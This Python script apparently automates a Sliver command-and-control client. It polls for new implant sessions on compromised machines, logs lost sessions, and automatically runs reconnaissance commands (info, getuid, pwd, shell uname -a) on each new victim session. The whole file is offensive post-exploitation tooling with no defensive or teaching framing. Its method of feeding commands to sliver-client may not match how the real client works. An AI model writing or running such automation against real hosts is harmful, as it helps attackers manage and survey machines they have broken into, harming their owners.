#!/usr/bin/env python3

import subprocess
import time
import json
import re

class SliverMonitor:
    def __init__(self, check_interval=30):
        self.check_interval = check_interval
        self.known_sessions = set()
        
    def get_sessions(self):
        """Get current active sessions"""
        try:
            result = subprocess.run(['sliver-client', '-c', 'connect\nsessions\nexit'], 
                                  capture_output=True, text=True, timeout=10)
            return result.stdout
        except:
            return ""
    
    def parse_sessions(self, output):
        """Parse session information from Sliver output"""
        sessions = []
        lines = output.split('\n')
        for line in lines:
            if 'Session' in line and 'ID' in line:
                # Extract session ID using regex
                match = re.search(r'([a-f0-9-]{36})', line)
                if match:
                    sessions.append(match.group(1))
        return sessions
    
    def monitor_sessions(self):
        """Continuously monitor for new sessions"""
        print("[+] Starting session monitor...")
        print(f"[+] Checking every {self.check_interval} seconds")
        
        while True:
            try:
                output = self.get_sessions()
                current_sessions = set(self.parse_sessions(output))
                
                # Check for new sessions
                new_sessions = current_sessions - self.known_sessions
                if new_sessions:
                    print(f"\n[!] New session(s) detected: {new_sessions}")
                    for session in new_sessions:
                        self.handle_new_session(session)
                
                # Check for lost sessions
                lost_sessions = self.known_sessions - current_sessions
                if lost_sessions:
                    print(f"\n[!] Lost session(s): {lost_sessions}")
                
                self.known_sessions = current_sessions
                print(f"[*] Active sessions: {len(current_sessions)}")
                
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                print("\n[+] Monitor stopped by user")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(5)
    
    def handle_new_session(self, session_id):
        """Handle new session detection"""
        print(f"[+] Handling new session: {session_id}")
        
        # Auto-execute basic reconnaissance
        commands = [
            "info",
            "getuid",
            "pwd",
            "shell uname -a"
        ]
        
        for cmd in commands:
            try:
                script_content = f"connect\nuse {session_id}\n{cmd}\nexit"
                with open('/tmp/auto_recon.txt', 'w') as f:
                    f.write(script_content)
                
                result = subprocess.run(['sliver-client', '-c', '/tmp/auto_recon.txt'], 
                                      capture_output=True, text=True, timeout=15)
                print(f"[+] {cmd}: {result.stdout.strip()}")
                
            except Exception as e:
                print(f"[!] Error executing {cmd}: {e}")

if __name__ == "__main__":
    monitor = SliverMonitor(check_interval=10)
    monitor.monitor_sessions()
